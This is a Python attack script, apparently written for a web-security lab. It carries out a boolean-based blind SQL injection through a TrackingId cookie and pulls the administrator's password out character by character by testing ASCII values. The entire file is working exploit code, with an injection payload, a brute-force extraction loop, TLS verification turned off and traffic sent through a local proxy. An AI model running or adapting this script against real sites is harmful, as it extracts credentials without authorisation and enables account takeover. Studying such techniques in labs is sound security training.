import re, sys, urllib, urllib3, requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def find_cookes(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    print(f"[+] Cookes:{r.cookies.get_dict()}")
    return r.cookies.get_dict()

def csrf_token(s, url):
    s = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(s.text, 'html.parser')
    print(f"[+] CSRF TOKEN: {soup.find('input')['value']}")
    return soup.find('input')['value']

def login(s, l_url, passwd):
    csrf = csrf_token(s, l_url)
    data = {
        'csrf':csrf,
        'username':'administrator',
        'password':passwd,
    }
    r = s.post(l_url, data=data, verify=False, proxies=proxies)
    return True if "Log out" in r.text else False


def sqli(s, url, l_url):
    cookies = find_cookes(s, url)
    password = ''
    for i in range(1, 21):
        for j in range(32, 126):
            sql_payload = f"' and (select ascii(substring(password,{i},1)) from users where username='administrator')='{j}'--" 
            sql_paylod_encod = urllib.parse.quote(sql_payload)
            c = {'TrackingId':cookies['TrackingId']+sql_paylod_encod, 'session':cookies['session']}
            r = requests.get(url, cookies=c, verify=False, proxies=proxies)
            if 'Welcome' not in r.text:
                sys.stdout.write('\r' + password + chr(j))
                sys.stdout.flush()
            else:
                password += chr(j)
                sys.stdout.write('\r' + password)
                sys.stdout.flush()
                break



if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        l_url = sys.argv[2].strip()
    except:
        print('[*] Usage: %s <url>' % sys.argv[0])
        print('[*] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)
    
    s =requests.Session()
    sqli(s, url, l_url)